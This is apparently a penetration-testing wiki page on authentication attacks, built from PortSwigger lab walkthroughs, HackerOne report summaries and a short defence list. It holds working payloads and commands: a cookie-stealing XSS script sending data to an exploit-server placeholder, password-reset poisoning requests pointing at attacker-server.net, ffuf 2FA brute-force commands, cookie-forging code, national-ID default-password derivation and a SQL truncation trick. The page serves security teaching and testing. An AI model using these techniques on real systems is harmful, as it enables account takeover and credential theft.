---
title: "Authentication Attacks"
type: technique
tags: [authentication, brute-force, enumeration, exploitation, h1, portswigger, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [ps-general-concepts, ps-indepth-attacks, ps-labs-auth, thm-adv-auth-bruteforce, h1-scraped-authentication-attacks, git-portswigger-all-labs]
---

## What it is

Authentication attacks target weaknesses in the mechanisms that verify user identity — from brute-forcing credentials to bypassing the authentication flow entirely via logic flaws. A successful attack gives the attacker the full privileges of the compromised account.

## How it works

Authentication vulnerabilities arise in two main ways: the mechanism fails to prevent brute-force attacks, or flawed application logic allows an attacker to bypass authentication steps altogether. Supplementary functionality — password reset, "stay logged in," and password change endpoints — is frequently less hardened than the main login form and provides additional attack surface.

## Prerequisites

- A login endpoint accepting username/password credentials
- For enumeration: observable differences in responses (status codes, messages, timing)
- For reset-token attacks: access to the password reset flow (no authentication required)
- For cookie/token attacks: ability to register an account to study token generation, or to steal a token via XSS

## Methodology

### 1. Username Enumeration

Compare the application response for valid vs. invalid usernames:

- **Error message differences**: `Invalid username or password` vs. `Incorrect password` — even a trailing space difference is exploitable.
- **Status code differences**: A `302` on valid username + wrong password vs. `200` on completely invalid credentials.
- **Response timing**: If the backend only validates the password after checking the username exists, a valid username + a very long password will produce a measurably slower response.

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=candidate&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Use Burp Intruder (Sniper) with a username wordlist. Sort by response length or time to spot the outlier.

### 2. Brute Force Login

Once a valid username is known, iterate through a password list:

```http
POST /login HTTP/1.1
username=identified-user&password=§candidate§
```

Look for a `302` redirect or a different response body/length that signals success.

### 3. Bypassing Brute-Force Protections

**IP-based rate limiting bypass** — many applications trust the `X-Forwarded-For` header. Increment this value per request to present a different apparent IP:

```http
X-Forwarded-For: 10.0.0.§1§
```

Use Burp Intruder Pitchfork with one payload list incrementing `X-Forwarded-For` and another iterating passwords.

**Counter-reset bypass** — if a failed-attempt counter resets on successful login, interleave a known-good credential in the wordlist. A script can generate a synchronised list:

```sh
python3 enhanced_brute_auth.py -u usernames.txt -p passwords.txt -t 2 -legit wiener:peter -o attack
```

Set Intruder resource pool to 1 concurrent request so the interleaved login fires in the correct order.

Manual Pitchfork construction — create two synchronised payload lists where the valid credential appears every other entry:

```
Payload 1 (username): wiener, carlos, wiener, carlos, ...
Payload 2 (password): peter, password1, peter, password2, ...
```

Each `wiener:peter` pair resets the failure counter; the subsequent `carlos:passwordN` pair tests the target. A `302` response on a carlos entry reveals the correct password.

**Null payload lockout enumeration** — send 5–10 repeated requests against each username using Burp Intruder null payloads (no payload modification). A username that eventually returns `"You have made too many incorrect login attempts"` instead of `"Invalid username or password"` is valid — the lockout only fires when the backend can find and lock a real account.

**JSON array credential bypass** — when the login endpoint accepts a JSON body, check whether the `password` field accepts an array. If so, submit the entire password wordlist as one request, bypassing per-request rate limiting entirely:

```json
{"username": "carlos", "password": ["password1", "password2", "password3", ...]}
```

The server processes each array element independently. A `302` response confirms a match. This sidesteps IP-based or request-count rate limiting because only one HTTP request is sent.

**Account lockout enumeration** — try each username with the same small password set (within the lockout threshold). A username that returns a lockout message instead of "invalid credentials" confirms validity.

### 4. "Stay Logged In" Cookie Attacks

Analyse the persistent cookie set by "remember me" functionality. A common pattern:

```python
base64(username:md5(password))
```

Confirm by decoding your own cookie. Then brute-force target users:
- Payload: password wordlist
- Processing: MD5 hash → prepend `carlos:` → Base64 encode
- Match on the response that grants access to the target's account page.

**Offline hash extraction via XSS** — if the application has a stored XSS vulnerability and a victim is logged in with a "remember me" cookie, steal the cookie and crack the embedded hash offline:

```js
<script>document.location='//YOUR-EXPLOIT-SERVER.net/'+document.cookie</script>
```

The access log on the exploit server will show the victim's `stay-logged-in` cookie value. Decode from Base64 to retrieve `username:md5hash`. Crack the MD5 hash at crackstation.net or with hashcat, then log in directly.

### 5. Password Reset Exploitation

**Broken token validation** — some applications accept the reset form without re-validating the token. Remove the token from the request body and change the `username` parameter to target another user.

**Password reset poisoning via middleware** — the server dynamically generates the reset link hostname using `X-Forwarded-Host`. Inject a controlled domain to capture the reset token from the victim's email:

```http
POST /forgot-password HTTP/1.1
X-Forwarded-Host: attacker-server.net

username=carlos
```

The victim receives a reset email with a link pointing to `attacker-server.net`. Check the attacker server access log for the token parameter, then use it in the legitimate reset URL.

**Guessable reset URL parameter** — if the reset URL uses `?user=carlos` instead of a random token, simply change the value.

### 6. Password Change as Brute-Force Oracle

The password change form can be abused to brute-force the current password without triggering account lockout, by exploiting the difference in error responses:

| Current password | New PW 1 | New PW 2 | Response |
|---|---|---|---|
| Correct | A | B (different) | `New passwords do not match` |
| Correct | A | A (same) | `Password changed successfully` |
| Incorrect | A | B (different) | `Current password is incorrect` |
| Incorrect | A | A (same) | Account lockout triggered |

**Exploit:** Always send two different new passwords. The server validates the current password first — if it's correct, it moves on and checks the mismatch. Use Burp Intruder (Sniper) on the `current-password` field with `new-password-1` ≠ `new-password-2`. Grep for `New passwords do not match` to identify the hit. Change the username parameter to target another user's account if the username is embedded in the form as a hidden field.

### 7. 2FA Simple Bypass

After completing step 1 of login (correct password), navigate directly to an authenticated page (e.g., `/my-account`) without completing the 2FA step. If the application grants access, 2FA is not enforced server-side before granting session state.

### 8. 2FA Broken Logic (Account Cookie Manipulation)

Observe the multi-step login flow:

```http
POST /login-steps/first
username=carlos&password=qwerty

→ HTTP/1.1 200 OK
Set-Cookie: account=carlos

POST /login-steps/second
Cookie: account=victim-user
verification-code=§000000§
```

Log in with your own credentials to obtain the session, then change the `account` cookie (or equivalent) to the target username when submitting the verification code. Brute-force the 4–6 digit code with Burp Intruder (Sniper, numeric brute force 000000–999999).

Alternative with ffuf (no Burp Pro required):

```sh
ffuf -X POST -u "https://TARGET/login2" \
  -H "Cookie: verify=carlos; session=SESSION_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "mfa-code=FUZZ" \
  -w /path/to/numbers.txt \
  -fc 400,401,200
```

Generate a numbers wordlist (0000–9999) for fuzzing:

```sh
seq -w 0 9999 > numbers.txt
```

### 9. 2FA Brute-Force with CSRF Token Rotation (Expert)

When the 2FA endpoint uses CSRF tokens that change with each request, a standard Intruder attack fails because every request after the first will have a stale token. Use Burp Suite session handling macros to refresh tokens automatically:

1. Go to **Project Options → Sessions → Session Handling Rules → Add**.
2. Set the rule to run a **macro** before every Intruder request.
3. Record the macro using these requests in order:
   - `GET /login` — fetch fresh CSRF token
   - `POST /login` — submit valid credentials (re-authenticate)
   - `GET /login2` — load the 2FA page (establishes fresh 2FA session state)
4. Configure the macro to extract the CSRF token from `GET /login` and inject it into subsequent requests.
5. Send `POST /login2` to Intruder; set the `mfa-code` parameter as the payload position.
6. Set payload type to **Numbers**, range `0000–9999`, step `1`, min/max integer digits `4`, fraction digits `0`.
7. Set **Maximum Concurrent Requests** to `1` (ensures macro runs before each request in sequence).
8. Look for a `302` response; use "Show response in browser" immediately (CSRF token expires quickly).

## Key Payloads / Examples

Username enumeration — response timing (Pitchfork):

```
Payload 1 (X-Forwarded-For): 1, 2, 3, 4 ...
Payload 2 (username):         admin, user, info ...
Password (static long string): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Stay-logged-in cookie construction:

```python
import hashlib, base64
password = "target_password"
cookie = base64.b64encode(f"carlos:{hashlib.md5(password.encode()).hexdigest()}".encode()).decode()
```

Password reset poisoning request:

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

## Bypasses and Variants

| Defence | Bypass |
|---|---|
| IP rate limiting | Rotate `X-Forwarded-For` value per request |
| Account lockout | Stay below lockout threshold; use Cluster Bomb with small password set across many usernames |
| Failed-attempt counter | Interleave a successful login credential every N attempts to reset counter (Pitchfork) |
| CAPTCHA on reset | Manual interaction; automation not feasible without solver |
| Time-limited reset token | Exploit token before expiry; also check if token is validated on form submission |
| Per-request rate limiting | Submit all passwords in a JSON array in one request (if endpoint accepts JSON) |
| 2FA with CSRF token rotation | Use Burp macro to re-authenticate and fetch fresh CSRF before each Intruder request |
| Lockout on password change | Use mismatched new passwords to detect correct current password without locking account |

**Credential stuffing** is distinct from targeted brute force — it uses known `username:password` pairs from breaches. Account lockout does not protect against it because each username is only tried once.

**HTTP Basic Authentication** — token is just `base64(username:password)` in the `Authorization` header; can be brute-forced at the header level and offers no CSRF protection.

## Real-World Examples (HackerOne — paid reports)

The following reports are drawn from 65 paid HackerOne disclosures (5 critical, top bounty $15,000). They illustrate the four most impactful authentication failure classes: broken authorization on privileged internal services, recovery-flow bypass, SSO token theft, and weak session signing.

### Incorrect authorization on TikTok's intelbot service ($15,000 critical — TikTok, #1328546)

TikTok's internal `intelbot` service — used to query support ticket data — failed to enforce authentication. Any authenticated TikTok user could hit the service endpoint directly and retrieve ticket information belonging to arbitrary users. The weakness was classified as Improper Authentication (Generic): the application validated that the caller was logged in, but not that they were permitted to access intelbot at all. **Takeaway:** privilege checks on internal micro-services must be independent of the outer application's session check; being authenticated to the product does not imply authorization to every backend service.

### Account takeover via recovery-flow authentication bypass ($12,000 critical — TikTok, #2443228)

The TikTok account-recovery flow could be completed for an arbitrary target account by manipulating the intermediate state of the recovery request. The attacker initiated recovery for their own account, intercepted the flow, then substituted the victim's account identifier before the final confirmation step — bypassing the authentication check that should have gated the password reset to the original requestor. **Takeaway:** account-recovery flows must bind the recovery session to the original identity at every step, not just at initiation.

### Mass account takeover without user interaction — TaxJar/Stripe ($13,000 high — Stripe, #1685970)

The TaxJar integration (a Stripe acquisition) allowed an attacker to take over accounts at scale with no victim interaction. The OAuth token issuance path used an alternate channel that skipped the standard user-consent and authentication checks, enabling the attacker to mint valid session tokens for arbitrary accounts. **Takeaway:** alternate authentication paths (OAuth callbacks, API key generation, third-party integrations) must go through the same identity verification as the primary login flow.

### SSO login token theft — Snapchat Publisher ($7,500 high — Snapchat, #265943)

The `snappublisher.snapchat.com` login flow passed the SSO token through a URL parameter that was logged in browser history, referrer headers, and server-side logs. An attacker who could read any of those sources — including a malicious ad network or a shared computer — could replay the token and hijack the session. **Takeaway:** SSO tokens must travel only in POST bodies or `Authorization` headers, never in URLs; the redirect target must be validated against a strict allowlist.

### SAML authentication bypass — Uber internal chat ($8,500 high — Uber, #223014)

`uchat.uberinternal.com` accepted a SAML assertion where the signature validation could be bypassed by manipulating the XML structure. The researcher was able to craft a SAML response that asserted an arbitrary employee identity and was accepted as valid. **Takeaway:** use a well-audited SAML library; validate signatures on the entire assertion, not just selected elements; reject assertions with unexpected XML canonicalization.

### Weak session signing on jarvis-new.urbanclap.com ($1,500 critical — Urban Company, #1380121)

The internal Jarvis dashboard signed session tokens with a predictable or hardcoded secret. Once the researcher identified the signing algorithm (e.g., JWT with `HS256`) and brute-forced or guessed the secret, they could forge tokens for any user including administrators. **Takeaway:** session-signing secrets must be long, random, and rotated regularly; `alg: none` and weak-secret JWT attacks are trivially scriptable — always use asymmetric signing for high-value internal tools.

### SSO DoS enabling account takeover — Grammarly/Superhuman ($10,500 high — Superhuman, #976603)

The researcher found that any authenticated user could delete or corrupt another organisation's SSO configuration, effectively disabling SSO for that tenant. This forced affected users to fall back to password authentication — which could be targeted separately — or locked them out entirely. Combined with a password-reset attack, this created an account-takeover chain. **Takeaway:** SSO configuration management endpoints must enforce strict organisation-level RBAC; SSO state changes should require re-authentication.

### OAuth email-verification bypass enabling third-party account takeovers ($3,000 high — GitLab, #922456)

GitLab's OAuth grant flow did not require that the authorising user's email address be verified before issuing tokens to third-party applications. An attacker could register a GitLab account with a victim's email address (without verifying it), then use OAuth to obtain tokens for third-party services that trusted GitLab's identity assertion. **Takeaway:** OAuth providers must verify the primary email address before issuing identity assertions to relying parties; unverified-email accounts must be scoped down or blocked from third-party OAuth flows.

### GitHub SSH certificate authentication bypass on gist.github.com ($10,000 high — GitHub, #1901040)

SSH certificates issued for certain GitHub contexts were accepted by `gist.github.com` without proper scope validation. A certificate legitimately issued for one context could be replayed against the gist service to authenticate as the certificate's subject. **Takeaway:** SSH certificate principals and extensions must explicitly scope the valid services; any service accepting certificates must validate the certificate's intended scope, not just the signature.

## Detection and Defence

- Use identical generic error messages regardless of whether the username or password is wrong
- Return consistent HTTP status codes and normalise response times across all login paths
- Implement IP-based rate limiting — do not rely solely on `X-Forwarded-For` (it is spoofable)
- Add CAPTCHA after a small number of failed attempts
- Generate password reset tokens with high entropy; validate the token on form submission; expire tokens after short periods and destroy immediately on use
- Cookie-based "remember me" tokens must be random and high-entropy — do not encode credentials in any form
- On password reset, destroy all active sessions

## Tools

- [[burp-suite]] — Intruder (Sniper / Pitchfork / Cluster Bomb), Repeater
- [[wiki/tools/ffuf]] — fast HTTP fuzzing for login endpoints
- [[hydra]] — network login brute force
- hashcat — offline cracking of password hashes found in cookies
- CyberChef — Base64/hash manipulation for cookie analysis

## PortSwigger Labs

### Lab 1 — Username enumeration via different responses (Apprentice)

Send username wordlist in Burp Intruder (Sniper). The valid username returns a different error message (`Incorrect password` vs `Invalid username or password`) or a different response length. Switch to brute-forcing the password once the username is confirmed; look for a `302` redirect.

### Lab 2 — 2FA simple bypass (Apprentice)

Log in with the target's credentials (step 1). When redirected to the 2FA page, manually navigate to `/my-account` instead of completing 2FA. Access is granted because the server issues a session cookie after step 1 without enforcing step 2.

### Lab 3 — Password reset broken logic (Apprentice)

Trigger a password reset for your own account, intercept the `POST /forgot-password` submission. Delete the `token` parameter value entirely and change `username` to the target. The server resets the target's password without validating the token.

```http
POST /forgot-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password-1=newpass&new-password-2=newpass
```

### Lab 4 — Username enumeration via subtly different responses (Practitioner)

Same approach as Lab 1 but the error messages are nearly identical. Sort Intruder results by response length — the valid username produces a slightly shorter (or longer) response because the trailing period or spacing in the message differs.

### Lab 5 — Username enumeration via response timing (Practitioner)

The application locks out after ~5 attempts. Bypass with a unique `X-Forwarded-For` value per request (use Battering Ram so both the header and username use the same payload slot). Pair with an absurdly long password — the server only spends time checking the password if the username exists, making valid usernames measurably slower.

```
Attack type: Pitchfork
Payload 1 (X-Forwarded-For): incrementing IPs (1, 2, 3 ...)
Payload 2 (username): wordlist
Static password: AAAA...AAAA (100+ chars)
```

### Lab 6 — Broken brute-force protection, IP block (Practitioner)

The IP-based failure counter resets on any successful login from that IP. Use Pitchfork with interleaved credentials:

```
Payload 1 (username): wiener, carlos, wiener, carlos, ...
Payload 2 (password): peter, <candidate1>, peter, <candidate2>, ...
```

Every `wiener:peter` resets the counter; the following `carlos:<candidate>` tests the target. A `302` on a carlos row reveals the password.

### Lab 7 — Username enumeration via account lock (Practitioner)

Send 5 null payload requests (identical repeated requests) for each candidate username in a Cluster Bomb or nested Intruder run. Valid usernames eventually return `"You have made too many incorrect login attempts"` while invalid ones always return `"Invalid username or password"`. Once confirmed, wait for the lockout to expire (typically 1 minute), then brute-force the password within the 3-attempt window using a single Sniper run.

### Lab 8 — 2FA broken logic (Practitioner)

Log in with your own credentials. Intercept the `POST /login2` request and change the `verify` cookie to the target username. Brute-force the 4-digit MFA code with Burp Intruder (Sniper, numeric 0000–9999). Look for a `302`.

Alternative with ffuf (no Burp Pro):

```sh
ffuf -X POST -u "https://TARGET/login2" \
  -H "Cookie: verify=carlos; session=SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "mfa-code=FUZZ" -w numbers.txt -fc 200
```

### Lab 9 — Brute-forcing a stay-logged-in cookie (Practitioner)

Log in with `wiener:peter` and check the `stay-logged-in` cookie. Decode from Base64: `wiener:<md5hash>`. Confirm the hash is `md5("peter")`. Use Intruder (Sniper) on the cookie header with payload processing:

1. Hash: MD5
2. Add prefix: `carlos:`
3. Encode: Base64

A longer response length in Intruder results identifies the valid cookie value.

### Lab 10 — Offline password cracking (Practitioner)

The application stores `stay-logged-in` cookies as `base64(username:md5(password))` and has a stored XSS on blog comments. Inject a cookie-stealing payload:

```js
<script>document.location='//YOUR-EXPLOIT-SERVER.net/'+document.cookie</script>
```

Retrieve the victim's cookie from the exploit server access log. Decode Base64 to get `carlos:<md5hash>`. Crack at crackstation.net. Log in as carlos and delete the account.

### Lab 11 — Password reset poisoning via middleware (Practitioner)

The server uses `X-Forwarded-Host` to build the reset link (reverse proxy environment). Intercept the `POST /forgot-password` request and add:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net
```

Submit with `username=carlos`. The victim receives an email with a reset link pointing to your server. Retrieve the token from the access log and use it in the legitimate reset URL to set a new password.

Note: if direct `Host` header manipulation returns an error, fall back to `X-Forwarded-Host` — reverse proxies often forward this header to the application unchanged.

### Lab 12 — Password brute-force via password change (Practitioner)

The password change form embeds `username` as a hidden field (client-controlled). Send the form to Intruder; change `username` to the target. Always submit two different new passwords. Grep for `"New passwords do not match"` — this response means the current password guess was correct (server checked it before checking the new-password match).

```http
POST /my-account/change-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§candidate§&new-password-1=abc&new-password-2=xyz
```

### Lab 13 — Broken brute-force protection, multiple credentials per request (Expert)

The login endpoint accepts JSON. Rate limiting fires after 3 failed attempts regardless of header manipulation. Bypass by supplying the entire password list as a JSON array in a single request:

```json
{"username": "carlos", "password": ["password1", "password2", "password3", "..."]}
```

Send in Burp Repeater. A `302` response indicates the correct password was found in the array. Use "Show response in browser" to obtain the authenticated session.

### Lab 14 — 2FA bypass using a brute-force attack (Expert)

The 2FA endpoint uses per-request CSRF tokens, making raw Intruder attacks fail after the first request. Solve with Burp session handling macros:

1. **Project Options → Sessions → Session Handling Rules → Add**
2. Set rule action to **Run a macro**
3. Record macro: `GET /login` → `POST /login` → `GET /login2`
4. Configure macro to extract CSRF token from `GET /login` and propagate it
5. Add all lab URLs to Burp scope (required for macro to trigger on Intruder requests)
6. Send `POST /login2` to Intruder; mark `mfa-code` as payload position
7. Payload: Numbers, 0000–9999, min/max digits = 4, fraction digits = 0
8. Resource pool: max 1 concurrent request
9. Look for `302`; show response in browser immediately (tokens expire fast)

## Timing side-channel behind a content-identical anti-enumeration control

Distinct from the classic slow-password-hash timing oracle: this is a password-reset/registration-adjacent endpoint doing everything right at the content layer, both branches return the exact same byte-for-byte body and status code, defeating any diff-based enumeration check. The leak is that the account-exists branch triggers a BLOCKING call to an external system (most commonly an outbound mail send) before responding, while the no-account branch throws/returns immediately.

If that outbound system is slow, misconfigured, or unreachable, the timing gap can be enormous (tens of times baseline) rather than the few-millisecond differences typical of hash-comparison timing attacks, making it trivially distinguishable with a handful of samples. Measure with several interleaved requests against known-real and synthetic identifiers, and pair every timing claim with a same-domain synthetic control to isolate the account-existence variable from network/DNS variance.

When writing this up, name explicitly that the deployed anti-enumeration setting IS working at the content layer; the finding is that an unrelated operational fault silently reopens the exact channel that setting was meant to close.

## Default password IS the account holder's own checksummed PII

Many national ID formats encode sex+century+date-of-birth plus a serial, with one or more trailing checksum digits computed from the rest. A checksum digit is not free entropy: for a named individual whose sex and DOB are known, the space collapses to roughly the serial digits alone (e.g. a 3-digit serial = 1,000 candidates, not the full digit-string range), because the checksum invalidates all but one serial per candidate:

```python
def checksum(d10):
    w1=[1,2,3,4,5,6,7,8,9,1]; w2=[3,4,5,6,7,8,9,1,2,3]
    s=sum(a*b for a,b in zip(d10,w1))%11
    if s!=10: return s
    s=sum(a*b for a,b in zip(d10,w2))%11
    return 0 if s==10 else s
```

Combine with absent login lockout/rate-limit for same-day account takeover requiring no credential guess in the conventional sense, and check for any OTHER unauthenticated endpoint that discloses a person's name together with their national ID: that pairing directly supplies the exact default credential, skipping derivation entirely.

## Sources

- PortSwigger Academy: Authentication Vulnerabilities (General Concepts)
- PortSwigger Academy: In-depth Attacks — Authentication
- PortSwigger Labs: Labs 1–14 (Authentication Vulnerabilities)
- TryHackMe: Enumeration & Brute Force room

## Wired sub-techniques
- [[passkey-webauthn-attacks]]

<!-- auto-wired: context-reachable sub-technique pages -->
- [[mfa-bypass]]
- [[webauthn-passkey]]
- [[captcha-bypass]]
- [[email-address-parsing-attacks]]
- [[session-management-attacks]]
- [[type-juggling]]

<!-- promoted-slug: a-correctly-content-masked-anti-enumeration-control-byte-ide -->

<!-- promoted-slug: a-government-national-identity-number-used-as-the-default-ac -->

## SQL Truncation Duplicate-Account Auth Bypass

Register an account that collides with an existing privileged one (e.g. `admin`) by abusing
silent string truncation on INSERT. Works when the registration duplicate-check and the INSERT
disagree about length: MySQL in non-strict mode (`STRICT_ALL_TABLES` off, the pre-5.7 default)
truncates an over-length string to the column width on write AND ignores trailing spaces in
`=` comparisons.

Mechanism:
- The dup-check `SELECT ... WHERE username = 'admin' + <spaces> + 'x'` does NOT match the real
  `admin` row (the trailing `x` makes the compared value differ), so registration is allowed.
- The `INSERT` truncates the padded value to the column width, dropping the `x` and leaving
  `admin` + spaces, which MySQL later compares equal to `admin`.
- You now own a second row whose effective username is the privileged account, with a password
  you chose. Log in as the privileged username with your password.

Payload: register `admin` (or the exact target username, incl. an email like `admin@bank.a`)
followed by ~20 spaces and one junk char, so the junk lands past the column width:
```
username = admin<20 spaces>a       # sent url-encoded; client maxlength is bypassed via curl/Burp
```
Then log in as `admin` / <your password> -> authenticated as the privileged user.

Gotchas / boundary:
- Only fires on non-strict SQL modes; strict mode errors instead of truncating. Common on legacy
  PHP/MySQL stacks (recognisable by old Apache/PHP banners).
- The junk char after the spaces is essential: without it the dup-check's trailing-space folding
  matches the existing row and registration is refused.
- Confirm by observing a successful auth (redirect/session) as the target username; a plain
  "registered" message is not proof.

Distinct from **Email Truncation for Domain Bypass** (see business-logic): that abuses a fixed-
length cut to smuggle a trusted domain suffix; this abuses the same truncation to forge a
duplicate of a *privileged username*.

<!-- promoted-slug: sql-truncation-dup-account -->
